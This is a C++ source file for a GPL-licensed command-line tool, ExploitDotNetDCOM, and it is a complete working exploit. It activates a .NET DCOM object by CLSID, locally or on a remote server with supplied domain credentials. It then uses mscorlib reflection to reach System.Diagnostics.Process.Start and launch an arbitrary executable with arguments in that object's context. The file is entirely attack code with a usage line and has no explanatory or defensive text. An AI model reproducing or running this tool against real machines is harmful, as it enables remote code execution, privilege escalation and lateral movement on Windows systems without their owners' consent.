// ExploitDotNetDCOM is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// ExploitDotNetDCOM is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with ExploitDotNetDCOM.  If not, see <http://www.gnu.org/licenses/>.

#include "stdafx.h"
#include <vector>
#import <mscorlib.tlb> rename("ReportEvent", "_ReportEvent")
#include <mscoree.h>

long GetSafeArrayLen(LPSAFEARRAY psa)
{
	long ubound = 0;

	SafeArrayGetUBound(psa, 1, &ubound);

	return ubound + 1;
}

mscorlib::_MethodInfoPtr GetStaticMethod(mscorlib::_TypePtr type, LPCWSTR findName, int pcount)
{
	LPSAFEARRAY methods = type->GetMethods_2();
	mscorlib::_MethodInfoPtr ret;
	LONG methodCount = GetSafeArrayLen(methods);

	for (long i = 0; i < methodCount; ++i)
	{
		IUnknown* v = nullptr;

		if (SUCCEEDED(SafeArrayGetElement(methods, &i, &v)))
		{
			mscorlib::_MethodInfoPtr method = v;

			bstr_t name = method->Getname();
			LPSAFEARRAY params = method->GetParameters();
			long paramCount = GetSafeArrayLen(params);

			if (method->IsStatic && wcscmp(name.GetBSTR(), findName) == 0 && paramCount == pcount)
			{
				ret = method;
				break;
			}
		}
	}

	SafeArrayDestroy(methods);

	return ret;
}

template<typename T> T ExecuteMethod(mscorlib::_MethodInfoPtr method, std::vector<variant_t>& args)
{
	variant_t obj;
	T retObj;

	SAFEARRAY * psa;
	SAFEARRAYBOUND rgsabound[1];

	rgsabound[0].lLbound = 0;
	rgsabound[0].cElements = args.size();
	psa = SafeArrayCreate(VT_VARIANT, 1, rgsabound);

	for (LONG indicies = 0; indicies < (LONG)args.size(); ++indicies)
	{
		SafeArrayPutElement(psa, &indicies, &args[indicies]);
	}

	variant_t ret = method->Invoke_3(obj, psa);

	if ((ret.vt == VT_UNKNOWN) || (ret.vt == VT_DISPATCH))
	{
		retObj = ret.punkVal;
	}

	SafeArrayDestroy(psa);

	return retObj;
}

void ExploitDCOM(bstr_t clsidStr, bstr_t server, bstr_t username, bstr_t password, bstr_t exec, bstr_t args)
{
	CLSID clsid;

	CLSIDFromString(clsidStr, &clsid);

	MULTI_QI qis[1] = { 0 };
	qis[0].pIID = &IID_IUnknown;
	HRESULT hr = E_FAIL;

	if (server.length() > 0)
	{
		COAUTHINFO authInfo = { 0 };
		COSERVERINFO serverInfo = { 0 };
		COAUTHIDENTITY authIdentity = { 0 };
		serverInfo.pwszName = server;

		if (username.length() > 0)
		{
			serverInfo.pAuthInfo = &authInfo;
			authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
			authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
			authInfo.pwszServerPrincName = nullptr;
			authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
			authInfo.dwCapabilities = EOAC_NONE;

			wchar_t* user = wcschr(username.GetBSTR(), '\\');			

			if (user)
			{
				*user = 0;
				user++;
				authIdentity.Domain = (USHORT*)username.GetBSTR();
				authIdentity.DomainLength = wcslen(username.GetBSTR());
			}
			else
			{
				user = username.GetBSTR();
			}

			if (password.length() > 0)
			{
				authIdentity.Password = (USHORT*)password.GetBSTR();
				authIdentity.PasswordLength = password.length();
			}

			authIdentity.User = (USHORT*)user;
			authIdentity.UserLength = wcslen(user);

			authInfo.pAuthIdentityData = &authIdentity;
			serverInfo.pAuthInfo = &authInfo;
		}		

		hr = CoCreateInstanceEx(clsid, nullptr, CLSCTX_REMOTE_SERVER, &serverInfo, 1, qis);
	}
	else
	{
		hr = CoCreateInstanceEx(clsid, nullptr, CLSCTX_LOCAL_SERVER, nullptr, 1, qis);
	}
 
	if (SUCCEEDED(hr) && SUCCEEDED(qis[0].hr))
	{		
		try
		{
			mscorlib::_ObjectPtr obj = qis[0].pItf;

			mscorlib::_TypePtr type = obj->GetType();

			// Get type of Type
			type = type->GetType();
			bstr_t targetType = L"System.Type";

			while (type->FullName != targetType)
			{
				type = type->BaseType;
			}

			_bstr_t versionString = wcsstr((const wchar_t*)type->Assembly->FullName, L"Version=");
					
			versionString = L"System.Diagnostics.Process, System, " + versionString;

			mscorlib::_MethodInfoPtr getTypeMethod = GetStaticMethod(type, L"GetType", 1);

			std::vector<variant_t> getTypeArgs;

			getTypeArgs.push_back(versionString);

			// Get process type
			type = ExecuteMethod<mscorlib::_TypePtr>(getTypeMethod, getTypeArgs);

			if (type)
			{
				mscorlib::_MethodInfoPtr startMethod = GetStaticMethod(type, L"Start", 2);

				if (startMethod)
				{
					std::vector<variant_t> startArgs;

					startArgs.push_back(exec);
					startArgs.push_back(args);

					ExecuteMethod<mscorlib::_ObjectPtr>(startMethod, startArgs);
				}
				else
				{
					printf("Couldn't find Start method");
				}
			}
			else
			{
				printf("Couldn't find Process Type");
			}
		}
		catch (_com_error e)
		{
			printf("COM Error: %ls\n", e.ErrorMessage());
		}

		qis[0].pItf->Release();
	}
	else
	{
		printf("Error get Class %ls IUnknown: %08X\n", clsidStr.GetBSTR(), hr);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc < 3)
	{
		printf("Usage: ExploitDotNetDCOM CLSID executable [\"args\" server domain\\username password]");
		return 1;
	}	

	bstr_t args = argc > 3 ? argv[3] : L"";
	bstr_t server = argc > 4 ? argv[4] : L"";
	bstr_t username = argc > 5 ? argv[5] : L"";
	bstr_t password = argc > 6 ? argv[6] : L"";
	
	CoInitialize(nullptr);

	CoInitializeSecurity(
		NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_DEFAULT,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		EOAC_NONE,
		NULL);

	ExploitDCOM(argv[1], server, username, password, argv[2], args);

	CoUninitialize();

	return 0;
}

